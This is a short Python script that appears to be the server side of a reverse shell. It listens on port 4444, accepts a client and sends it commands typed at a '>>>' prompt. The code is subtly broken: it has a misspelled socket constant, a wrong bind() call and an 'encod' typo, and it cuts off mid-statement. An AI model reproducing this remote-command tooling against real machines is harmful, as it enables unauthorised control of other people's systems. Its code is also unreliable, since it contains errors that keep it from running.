import sys
import socket

SERVER_IP = ""
PORT = 4444

s = socket.socket()
s.setsockopt(socket.SQL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(SERVER_IP, PORT)


s.listen(1)

while True:
    print(f'[+] listening as {SERVER_IP}:{PORT}')

    client = s.accept()
    print(f'[+] client connected {client[1]}')

    client[0].send('connected' .encode())
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encod())

        if cmd.lower